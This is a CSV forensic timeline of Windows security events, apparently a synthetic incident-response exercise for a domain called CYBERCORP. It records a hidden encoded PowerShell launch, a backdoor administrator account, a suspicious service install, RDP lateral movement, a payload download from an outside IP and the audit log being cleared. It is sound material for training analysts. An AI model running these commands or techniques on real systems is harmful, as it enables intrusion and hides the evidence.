datetime,message,timestamp_desc,source,event_type,hostname,user,filename,tag
2026-07-01T08:12:03.000000+00:00,"EventID 4624 An account was successfully logged on. Logon Type: 10 Source Network Address: 10.20.30.11 Microsoft-Windows-Security-Auditing",Event Logged,WinEVTX,4624,WS-FIN-012,j.durand,Security.evtx,windows
2026-07-01T08:12:07.000000+00:00,"EventID 4672 Special privileges assigned to new logon. Privileges: SeDebugPrivilege SeBackupPrivilege Microsoft-Windows-Security-Auditing",Event Logged,WinEVTX,4672,WS-FIN-012,j.durand,Security.evtx,windows
2026-07-01T08:13:21.000000+00:00,"EventID 4688 A new process has been created. New Process Name: C:\Windows\System32\cmd.exe Creator Process: explorer.exe",Event Logged,WinEVTX,4688,WS-FIN-012,j.durand,Security.evtx,windows
2026-07-01T08:14:02.000000+00:00,"EventID 4688 A new process has been created. New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line: powershell -nop -w hidden -enc SQBFAFgA",Event Logged,WinEVTX,4688,WS-FIN-012,j.durand,Security.evtx,windows
2026-07-01T08:15:44.000000+00:00,"EventID 4625 An account failed to log on. Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 10.20.30.99",Event Logged,WinEVTX,4625,SRV-DC-01,svc_backup,Security.evtx,windows
2026-07-01T08:15:49.000000+00:00,"EventID 4625 An account failed to log on. Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 10.20.30.99",Event Logged,WinEVTX,4625,SRV-DC-01,svc_backup,Security.evtx,windows
2026-07-01T08:16:12.000000+00:00,"EventID 4720 A user account was created. New Account Name: support_tmp Account Domain: CYBERCORP",Event Logged,WinEVTX,4720,SRV-DC-01,administrator,Security.evtx,windows
2026-07-01T08:17:30.000000+00:00,"EventID 4732 A member was added to a security-enabled local group. Group Name: Administrators Member Name: support_tmp",Event Logged,WinEVTX,4732,SRV-DC-01,administrator,Security.evtx,windows
2026-07-01T08:19:05.000000+00:00,"EventID 7045 A service was installed in the system. Service Name: UpdaterSvc Service File Name: C:\ProgramData\updater.exe Service Type: user mode service",Event Logged,WinEVTX,7045,WS-FIN-012,SYSTEM,System.evtx,windows
2026-07-01T08:21:18.000000+00:00,"EventID 4648 A logon was attempted using explicit credentials. Target Server Name: SRV-FILES-02 Additional Information: RDP",Event Logged,WinEVTX,4648,WS-FIN-012,j.durand,Security.evtx,windows
2026-07-01T08:23:41.000000+00:00,"EventID 4624 An account was successfully logged on. Logon Type: 3 Source Network Address: 10.20.30.12 Microsoft-Windows-Security-Auditing",Event Logged,WinEVTX,4624,SRV-FILES-02,j.durand,Security.evtx,windows
2026-07-01T08:25:09.000000+00:00,"EventID 5140 A network share object was accessed. Share Name: \\SRV-FILES-02\Finance Source Address: 10.20.30.11",Event Logged,WinEVTX,5140,SRV-FILES-02,j.durand,Security.evtx,windows
2026-07-01T08:27:33.000000+00:00,"EventID 4104 Creating Scriptblock text (1 of 1): Invoke-WebRequest -Uri http://198.51.100.23/payload.ps1 -OutFile C:\Users\Public\p.ps1 Microsoft-Windows-PowerShell",Event Logged,WinEVTX,4104,WS-FIN-012,j.durand,Microsoft-Windows-PowerShell%4Operational.evtx,windows
2026-07-01T08:29:56.000000+00:00,"EventID 1102 The audit log was cleared. Subject: CYBERCORP\support_tmp",Event Logged,WinEVTX,1102,SRV-DC-01,support_tmp,Security.evtx,windows
2026-07-01T08:31:02.000000+00:00,"EventID 4634 An account was logged off. Logon Type: 10",Event Logged,WinEVTX,4634,WS-FIN-012,j.durand,Security.evtx,windows
